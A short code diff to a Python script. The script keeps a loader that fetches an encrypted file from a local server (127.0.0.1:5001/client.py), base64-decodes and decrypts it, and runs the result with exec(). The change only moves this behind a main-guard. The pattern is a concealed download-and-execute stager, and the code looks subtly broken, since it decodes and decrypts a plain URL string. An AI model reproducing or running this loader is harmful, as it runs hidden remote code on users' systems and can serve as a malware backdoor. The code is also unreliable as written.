@@ -28,6 +28,7 @@ def decrypt(encrypted_content, key):
         return bytes(plaintext)
 
 
-url = f"http://127.0.0.1:5001/client.py"
+if __name__ == "__main__":
+    url = f"http://127.0.0.1:5001/client.py"
 
-exec(decrypt(base64.b64decode(request.urlopen(decrypt(base64.b64decode(url),key).decode('utf-8')).read()),key).decode('utf-8'))
+    exec(decrypt(base64.b64decode(request.urlopen(decrypt(base64.b64decode(url),key).decode('utf-8')).read()),key).decode('utf-8'))
